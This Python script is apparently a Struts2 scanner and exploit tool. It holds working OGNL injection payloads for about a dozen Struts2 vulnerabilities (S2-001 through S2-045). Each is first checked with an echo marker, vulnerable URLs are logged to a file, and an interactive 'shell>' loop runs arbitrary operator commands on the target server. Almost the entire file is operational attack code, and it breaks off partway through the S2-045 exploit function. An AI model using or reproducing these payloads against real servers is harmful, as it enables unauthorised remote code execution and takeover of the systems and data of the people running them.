import requests
import re
#import lxml
import sys
from bs4 import BeautifulSoup
import base64
import urllib.parse
import socket
import http.client
http.client.HTTPConnection._http_vsn = 10
http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'

def poc(url,x):
    try:
        res=requests.get(url,timeout=5)
    except Exception as e:
        print(e)
        return

    x=int(x)

#s2-001
    try:
        password='%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"echo","367568"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}'
        data={'username':'111','password':password}
        if '.action' in url or '.do' in url:
            url1=url
        else:
            url1=url+'/login.action'
        res=requests.get(url1,data,timeout=2)
        #print(res.text)
        if b'367568' in res.content and b'echo' not in res.content:
            print("----------存在S2-001----------")
            if x==0:
                with open('./漏洞url.txt','a') as f:
                    s=url+'\n'+'"----------存在S2-001----------"'+'\n\n\n\n'
                    f.write(s)
            while x:
                cmd = input("shell>")
                b = re.sub(' ', '","', str(cmd))
                c = '"' + b + '"'
                #print(c)
                password = '%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{' + c + '})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}'
                #print(password)
                data = {'username': '111', 'password': password}
                res = requests.get(url+'login.action', data)
                #print(res.content)
                m=re.findall(r'/tr>\\n(.*?)\\n\\x00',str(res.content))
                m = re.sub(r'\\n', '\n', str(m[0]))
                print(m)

        else:
            print("不存在S2-001")
    except:
        print("不存在S2-001")

#s2-005
    try:
        if '.action' in url or '.do' in url:
            url1=url
        else:
            url1=url+"/example/HelloWorld.action"
        web_path = "?%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&%28b%29%28%28%27%5C43context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5C75false%27%29%28b%29%29&%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&%28g%29%28%28%27%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest%28%29%27%29%28d%29%29&%28i2%29%28%28%27%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&%28i97%29%28%28%27%5C43xman.getWriter%28%29.println%28%5C43req.getRealPath%28%22%5Cu005c%22%29%29%27%29%28d%29%29&%28i99%29%28%28%27%5C43xman.getWriter%28%29.close%28%29%27%29%28d%29%29"
        exec_payload1 = "?%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003dfalse%27%29%28bla%29%28bla%29&%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&%28%27%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%27%29%28bla%29%28bla%29&%28%27%5Cu0023mycmd%5Cu003d%5C%27" + "echo 367568" + "%5C%27%27%29%28bla%29%28bla%29&%28%27%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte[51020]%27%29%28bla%29%29&%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&%28%27%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28bla%29%28bla%29&%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29"
        exec_payload2 = "?%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&%28b%29%28%28%27%5C43context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5C75false%27%29%28b%29%29&%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&%28g%29%28%28%27%5C43mycmd%5C75%5C%27" + "echo 367568" + "%5C%27%27%29%28d%29%29&%28h%29%28%28%27%5C43myret%5C75@java.lang.Runtime@getRuntime%28%29.exec%28%5C43mycmd%29%27%29%28d%29%29&%28i%29%28%28%27%5C43mydat%5C75new%5C40java.io.DataInputStream%28%5C43myret.getInputStream%28%29%29%27%29%28d%29%29&%28j%29%28%28%27%5C43myres%5C75new%5C40byte[51020]%27%29%28d%29%29&%28k%29%28%28%27%5C43mydat.readFully%28%5C43myres%29%27%29%28d%29%29&%28l%29%28%28%27%5C43mystr%5C75new%5C40java.lang.String%28%5C43myres%29%27%29%28d%29%29&%28m%29%28%28%27%5C43myout%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&%28n%29%28%28%27%5C43myout.getWriter%28%29.println%28%5C43mystr%29%27%29%28d%29%29"
        html1 = requests.post(url1 + exec_payload1,timeout=2)
        html2 = requests.post(url1 + exec_payload2,timeout=2)
        # print(html2.content)
        if b'367568' in html1.content and b'echo' not in html1.content:
            print("----------存在S2-005----------")
            if x==0:
                with open('./漏洞url.txt','a') as f:
                    s=url+'\n'+'"----------存在S2-005----------"'+'\n\n\n\n'
                    f.write(s)
            web=requests.post(url1 + web_path)
            m = re.findall(r"b'(.*?)\\n", str(web.content))
            print("web路径为：",m[0])
            while x:
                cmd = input('shell>')
                exec_payload1 = "?%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003dfalse%27%29%28bla%29%28bla%29&%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&%28%27%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%27%29%28bla%29%28bla%29&%28%27%5Cu0023mycmd%5Cu003d%5C%27" + cmd + "%5C%27%27%29%28bla%29%28bla%29&%28%27%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte[51020]%27%29%28bla%29%29&%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&%28%27%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28bla%29%28bla%29&%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29"
                html2 = requests.post(url1 + exec_payload1)
                d = re.findall(r"b'(.*?)\\n\\x00", str(html2.content))
                f = re.sub(r'\\n', '\n', d[0])
                print(f)
        elif b'367568' in html2.content and b'echo' not in html2.content:
            print("----------存在S2-005----------")
            while 1:
                cmd = input('1shell>')
                exec_payload2 = "?%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&%28b%29%28%28%27%5C43context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5C75false%27%29%28b%29%29&%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&%28g%29%28%28%27%5C43mycmd%5C75%5C%27" + cmd + "%5C%27%27%29%28d%29%29&%28h%29%28%28%27%5C43myret%5C75@java.lang.Runtime@getRuntime%28%29.exec%28%5C43mycmd%29%27%29%28d%29%29&%28i%29%28%28%27%5C43mydat%5C75new%5C40java.io.DataInputStream%28%5C43myret.getInputStream%28%29%29%27%29%28d%29%29&%28j%29%28%28%27%5C43myres%5C75new%5C40byte[51020]%27%29%28d%29%29&%28k%29%28%28%27%5C43mydat.readFully%28%5C43myres%29%27%29%28d%29%29&%28l%29%28%28%27%5C43mystr%5C75new%5C40java.lang.String%28%5C43myres%29%27%29%28d%29%29&%28m%29%28%28%27%5C43myout%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&%28n%29%28%28%27%5C43myout.getWriter%28%29.println%28%5C43mystr%29%27%29%28d%29%29"
                html2 = requests.post(url1 + exec_payload2)
                d = re.findall(r"b'(.*?)\\n\\x00", str(html2.content))
                f = re.sub(r'\\n', '\n', d[0])
                print(f)
        else:
            print("不存在S2-005")
    except:
        print("不存在S2-005")

#s2-007
    try:
        if '.action' in url or '.do' in url:
            url1=url
        else:
            url1=url+"/user.action"
        cmd='echo 367568'
        a='%27%20%2B%20%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27'+cmd+'%27%29.getInputStream%28%29%29%29%20%2B%20%27%0A'
        b=urllib.parse.unquote(a)
        data={'age':b}
        res=requests.post(url1,data=data,timeout=2)
        if b'367568' in res.content and b'echo' not in res.content:
            print("----------存在S2-007----------")
            if x==0:
                with open('./漏洞url.txt','a') as f:
                    s=url+'\n'+'"----------存在S2-007----------"'+'\n\n\n\n'
                    f.write(s)
            while x:
                cmd=input('shell>')
                a='%27%20%2B%20%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27'+cmd+'%27%29.getInputStream%28%29%29%29%20%2B%20%27%0A'
                b=urllib.parse.unquote(a)
                data={'age':b}
                res=requests.post(url1,data=data,timeout=2)
                res1=BeautifulSoup(res.content,'lxml')
                res2=res1.select('#user_age')
                c=re.sub(r'\n\n','',res2[0]['value'])
                print(c)
        else:
            print("不存在S2-007")
    except:
        print("不存在S2-007")

#s2-008
    try:
        if '.action' in url or '.do' in url:
            url1 = url
        else:
            url1 = url + "/devmode.action"
        cmd='echo 367568'
        url2="?debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23a%3d@java.lang.Runtime@getRuntime%28%29.exec%28%22"+cmd+"%22%29.getInputStream%28%29%2c%23b%3dnew%20java.io.InputStreamReader%28%23a%29%2c%23c%3dnew%20java.io.BufferedReader%28%23b%29%2c%23d%3dnew%20char%5b50000%5d%2c%23c.read%28%23d%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%23d%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29"
        res=requests.get(url1+url2,timeout=2)
        #print(res.content)
        if b'367568' in res.content and b'echo' not in res.content:
            print("----------存在S2-008----------")
            if x==0:
                with open('./漏洞url.txt','a') as f:
                    s=url+'\n'+'"----------存在S2-008----------"'+'\n\n\n\n'
                    f.write(s)
            while x:
                cmd = input("shell>")
                url2 = "?debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23a%3d@java.lang.Runtime@getRuntime%28%29.exec%28%22" + cmd + "%22%29.getInputStream%28%29%2c%23b%3dnew%20java.io.InputStreamReader%28%23a%29%2c%23c%3dnew%20java.io.BufferedReader%28%23b%29%2c%23d%3dnew%20char%5b50000%5d%2c%23c.read%28%23d%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%23d%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29"
                res = requests.get(url1+url2, timeout=2)
                #print(res.content)
                a = re.sub(r'\\x00', '', str(res.content)[2:-1])
                b = re.sub(r'\\n', '\n', a)
                c = re.sub(r'\n\n', '', b)
                print(c)
        else:
            print("不存在S2-008")
    except:
        print("不存在S2-008")

#s2-009
    try:
        if '.action' in url or '.do' in url or 'ajax/example5' in url:
            url1 = url
        else:
            url1 = url + "/ajax/example5"
        cmd='echo 367568'
        a="?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27"+cmd+"%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]"

        res=requests.post(url1+a,timeout=2)
        #print(res.text)
        if b'367568' in res.content and b'echo' not in res.content:
            print("----------存在S2-009----------")
            if x==0:
                with open('./漏洞url.txt','a') as f:
                    s=url+'\n'+'"----------存在S2-009----------"'+'\n\n\n\n'
                    f.write(s)
            while x:
                cmd=input('shell>')
                a="?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27"+cmd+"%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]"

                res=requests.post(url1+a,timeout=2)
                #print(res.content)
                a=re.findall(r"b'(.*?)\\n\\x00",str(res.content))
                b=re.sub(r'\\n','\n',str(a[0]))
                print(b)
        else:
            print("不存在S2-009")
    except:
        print("不存在S2-009")

#s2-012
    try:
        if '.action' in url or '.do' in url:
            url1 = url
        else:
            url1 = url + "/user.action"

        cmd = 'echo 367568'
        m = re.sub(' ', '","', str(cmd))
        n = '"' + m + '"'
        p = urllib.parse.quote(n)
        a = "%25%7B%23a%3D%28new%20java.lang.ProcessBuilder%28new%20java.lang.String%5B%5D%7B" + p + "%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new%20java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D"
        b = urllib.parse.unquote(a)
        data = {'name': b}
        res = requests.post(url1, data=data, timeout=2)
        if b'367568' in res.content and b'echo' not in res.content:
            print("----------存在S2-012----------")
            if x==0:
                with open('./漏洞url.txt','a') as f:
                    s=url+'\n'+'"----------存在S2-012----------"'+'\n\n\n\n'
                    f.write(s)
            while x:
                cmd=input("shell>")
                m=re.sub(' ','","',str(cmd))
                n='"'+m+'"'
                p=urllib.parse.quote(n)
                a="%25%7B%23a%3D%28new%20java.lang.ProcessBuilder%28new%20java.lang.String%5B%5D%7B"+p+"%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new%20java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D"
                b=urllib.parse.unquote(a)
                data={'name':b}
                res=requests.post(url1,data=data,timeout=2)
                #print(res.content)
                c=re.findall(r"b'(.*?)\\n\\x00",str(res.content))
                #print(c)
                e=re.sub(r'\\n','\n',c[0])
                print(e)

        else:
            print("不存在S2-012")
    except:
        print("不存在S2-012")

#s2-013
    try:
        if '.action' in url or '.do' in url:
            url1 = url
        else:
            url1 = url + "/link.action"

        a="?a=%24{233%2a233}"
        res=requests.post(url1+a,timeout=2)
        if b'54289' in res.content:
            print('-----------存在s2-013-----------')
            if x==0:
                with open('./漏洞url.txt','a') as f:
                    s=url+'\n'+'"----------存在S2-013----------"'+'\n\n\n\n'
                    f.write(s)
            while x:
                cmd = input("shell>")
                a = "?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec('" + cmd + "').getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println('dbapp%3D'%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D"
                res = requests.post(url1+ a, timeout=2)
                #print(res.content)
                a=re.findall(r"b'dbapp=(.*?)\\n\\x00",str(res.content))
                c = re.sub(r'\\n', '\n', a[0])
                print(c)
        else:
            print('不存在s2-013')
    except:
        print("不存在S2-013")

#s2-015
    try:
        if '.action' in url or '.do' in url:
            url1 = url
        else:
            url1 = url + "/param.action"
        if '.action' in url or '.do' in url:
            e = re.split('/', r)
            h=re.sub(e[-1],'',url)
        else:
            h=url+'/'
        cmd='echo 367568'
        m="%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27"+cmd+"%27%29.getInputStream%28%29%29%2C%23q%7D.action"
        n="?message=%25%7b%23%63%6f%6e%74%65%78%74%5b%27%78%77%6f%72%6b%2e%4d%65%74%68%6f%64%41%63%63%65%73%73%6f%72%2e%64%65%6e%79%4d%65%74%68%6f%64%45%78%65%63%75%74%69%6f%6e%27%5d%3d%66%61%6c%73%65%2c%23%6d%3d%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2e%67%65%74%43%6c%61%73%73%28%29%2e%67%65%74%44%65%63%6c%61%72%65%64%46%69%65%6c%64%28%27%61%6c%6c%6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%27%29%2c%23%6d%2e%73%65%74%41%63%63%65%73%73%69%62%6c%65%28%74%72%75%65%29%2c%23%6d%2e%73%65%74%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2c%74%72%75%65%29%2c%23%71%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%74%6f%53%74%72%69%6e%67%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27"+cmd+"%27%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%2c%23%71%7d"
        res1=requests.get(h+m,timeout=2)
        res2 = requests.get(url1 + n, timeout=2)
        #print(res1.text)
        if b'367568' in res1.content and b'echo' not in res1.content:
                print('-----------存在s2-015-----------')
                if x == 0:
                    with open('./漏洞url.txt', 'a') as f:
                        s = url + '\n' + '"----------存在S2-015----------"' + '\n\n\n\n'
                        f.write(s)
                while x:
                    cmd = input("shell>")
                    a = "%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27" + cmd + "%27%29.getInputStream%28%29%29%2C%23q%7D.action"
                    res = requests.get(h + a, timeout=2)
                    #print(res.text)
                    b = re.findall(r"</b> /(.*?)%0A.jsp", str(res.content))
                    c = urllib.parse.unquote(b[0])
                    print(c)
        elif 'fxxk' in res2.headers:
            if '367568' in res2.headers['fxxk']:
                print('-----------存在s2-015-----------')
                if x == 0:
                    with open('./漏洞url.txt', 'a') as f:
                        s = url + '\n' + '"----------存在S2-015----------"' + '\n\n\n\n'
                        f.write(s)
                while x:
                    cmd = input("shell>")
                    a = "?message=%25%7b%23%63%6f%6e%74%65%78%74%5b%27%78%77%6f%72%6b%2e%4d%65%74%68%6f%64%41%63%63%65%73%73%6f%72%2e%64%65%6e%79%4d%65%74%68%6f%64%45%78%65%63%75%74%69%6f%6e%27%5d%3d%66%61%6c%73%65%2c%23%6d%3d%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2e%67%65%74%43%6c%61%73%73%28%29%2e%67%65%74%44%65%63%6c%61%72%65%64%46%69%65%6c%64%28%27%61%6c%6c%6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%27%29%2c%23%6d%2e%73%65%74%41%63%63%65%73%73%69%62%6c%65%28%74%72%75%65%29%2c%23%6d%2e%73%65%74%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2c%74%72%75%65%29%2c%23%71%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%74%6f%53%74%72%69%6e%67%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27" + cmd + "%27%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%2c%23%71%7d"
                    res = requests.get(url1 + a, timeout=2)
                    print(res.headers['fxxk'])
            else:
                print('不存在s2-015')
        else:
            print('不存在s2-015')
    except:
        print("不存在S2-015")

#s2-016
    try:
        if '.action' in url or '.do' in url:
            url1 = url
        else:
            url1 = url + "/index.action"
        cmd='echo 367568'
        a="?redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%22"+cmd+"%22%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read%28%23d%29%2C%23genxor%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2C%23genxor.println%28%23d%29%2C%23genxor.flush%28%29%2C%23genxor.close%28%29%7D%0A"
        res=requests.get(url1+a,timeout=2)
        if b'367568' in res.content and b'echo' not in res.content:
            print('-----------存在s2-016-----------')
            if x==0:
                with open('./漏洞url.txt','a') as f:
                    s=url+'\n'+'"----------存在S2-016----------"'+'\n\n\n\n'
                    f.write(s)
            while x:
                cmd=input("shell>")
                a="?redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%22"+cmd+"%22%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read%28%23d%29%2C%23genxor%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2C%23genxor.println%28%23d%29%2C%23genxor.flush%28%29%2C%23genxor.close%28%29%7D%0A"
                res=requests.get(url1+a,timeout=2)
                #print(res.content)
                a=re.findall(r"b'(.*?)\\n\\x00",str(res.content))
                b=re.sub(r'\\n','\n',a[0])
                print(b)
        else:
            print('不存在s2-016')
    except:
        print("不存在S2-016")

#s2-032
    try:
        if '.action' in url or '.do' in url:
            url1 = url
        else:
            url1 = url + "/index.action"
        cmd='echo 367568'
        a="?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd="+cmd
        res=requests.get(url1+a,timeout=2)
        if b'367568' in res.content and b'echo' not in res.content:
            print('-----------存在s2-032-----------')
            if x==0:
                with open('./漏洞url.txt','a') as f:
                    s=url+'\n'+'"----------存在S2-032----------"'+'\n\n\n\n'
                    f.write(s)
            while x:
                cmd=input("shell>")
                a="?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd="+cmd
                res=requests.get(url1+a,timeout=2)
                #print(res.content)
                if res.status_code==200:
                    b=re.findall(r"b'(.*?)\\n'",str(res.content))
                    c=re.sub(r'\\n','\n',b[0])
                    print(c)
        else:
            print('不存在s2-032')
    except:
        print("不存在S2-032")

#s2-045
    try:
        if '.action' in url or '.do' in url:
            url1 = url
        else:
            url1 = url + "/doUpload.action"

        a="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data"
        headers={"Content-Type":a}
        res=requests.post(url1,headers=headers,timeout=2)
        if 'vulhub' in res.headers:
            if '54289' in res.headers['vulhub']:
                print('----------存在s2-045---------')
                if x == 0:
                    with open('./漏洞url.txt', 'a') as f:
                        s = url + '\n' + '"----------存在S2-045----------"' + '\n\n\n\n'
                        f.write(s)
                while x:
                    cmd=input('shell>')
                    def exploit(url, cmd):
                        payload = "%{(#_='multipart/form-data')."
                        payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
                        payload += "(#_memberAccess?"
                        payload += "(#_memberAccess=#dm):"
                        payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
                        payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
                        payload += "(#ognlUtil.getExcludedPackageNames().clear())."
                        payload += "(#ognlUtil.getExcludedClasses().clear())."
                        payload += "(#context.setMemberAccess(#dm))))."
                        payload += "(#cmd='%s')." % cmd
                        payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
                        payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
                        payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
                        payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
                        payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
                        payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
                        payload += "(#ros.flush())}"

                        headers = {
                            'User-Agent': 'struts-pwn (https://github.com/mazen160/struts-pwn)',
